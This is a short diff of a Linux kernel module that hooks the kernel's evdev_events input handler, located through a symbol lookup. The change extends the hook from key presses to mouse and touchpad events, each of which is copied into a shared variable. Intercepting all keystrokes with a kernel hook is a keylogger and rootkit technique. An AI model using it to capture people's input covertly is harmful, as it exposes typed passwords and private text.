@@ -98,15 +98,15 @@ static asmlinkage void hooked_evdev_events(struct input_handle *handle,
 {
     int i;
     for( i = 0; i < count; i++ ){
-        /* We don't care about anything except for keypresses */
-        if( vals[i].type != EV_KEY ){
+        /* We don't care about anything except for keypresses/mouse/touchpad */
+        if( vals[i].type != EV_KEY && vals[i].type != EV_REL && vals[i].type != EV_ABS ){
             continue;
         }
         spin_lock(&input_lock); // This could cause small input lag? Maybe add a buffer
         last_event = vals[i];
         fresh = true;
         spin_unlock(&input_lock);
-        //kprint("Event #(%d): type: %d - code: %d\n", i, vals[i].type, vals[i].code);
+        //kprint("Event #(%d): type: %d - code: %d - value: %d\n", i, vals[i].type, vals[i].code, vals[i].value);
     }
     orig_evdev_events( handle, vals, count );
 }
@@ -117,7 +117,7 @@ static int on_symbol__evdev_events(void *data,
                                    struct module *module,
                                    unsigned long address)
 {
-    if( strstr( name, "evdev_events" ) != NULL ){
+    if( !strcmp( name, "evdev_events" ) ){
         evdev_events_hook.name = name;
         evdev_events_hook.address = address;
         return 1; // non-zero stops iteration.
